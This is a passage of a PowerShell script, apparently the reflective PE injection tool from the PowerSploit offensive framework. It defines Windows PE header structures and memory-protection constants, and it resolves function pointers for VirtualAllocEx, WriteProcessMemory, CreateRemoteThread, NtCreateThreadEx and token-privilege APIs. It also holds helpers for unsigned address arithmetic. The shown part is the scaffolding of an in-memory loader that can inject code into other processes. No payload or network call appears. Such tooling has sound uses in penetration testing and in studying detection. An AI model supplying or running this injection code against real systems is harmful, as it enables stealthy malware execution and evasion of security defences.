		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
		$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
		$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
		$WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
		$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
		$WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
		$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
		$ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
		$ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
		$CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
		$CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
		$GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
		$GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
		$OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
		$OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
		$GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
		$GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
		$AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
		$AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
		$LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
		$LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
		$ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
		$ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
		$NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
		$NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
		$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
		$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
		$CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
		$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


	Function Get-Hex
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		$Value #We will determine the type dynamically
		)

		$ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
		$Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

		return $Hex
	}
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
		[IntPtr]
		$EndAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
		[IntPtr]$FinalEndAddress = [IntPtr]::Zero
		if ($PsCmdlet.ParameterSetName -eq "Size")
		{
			[IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		}
		else
		{
			$FinalEndAddress = $EndAddress
		}
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
		Param
		(
			[OutputType([Type])]
			
			[Parameter( Position = 0)]
			[Type[]]
			$Parameters = (New-Object Type[](0)),
			
			[Parameter( Position = 1 )]
			[Type]
			$ReturnType = [Void]
		)

		$Domain = [AppDomain]::CurrentDomain
		$DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
		$TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
		$ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
		$ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
		$MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
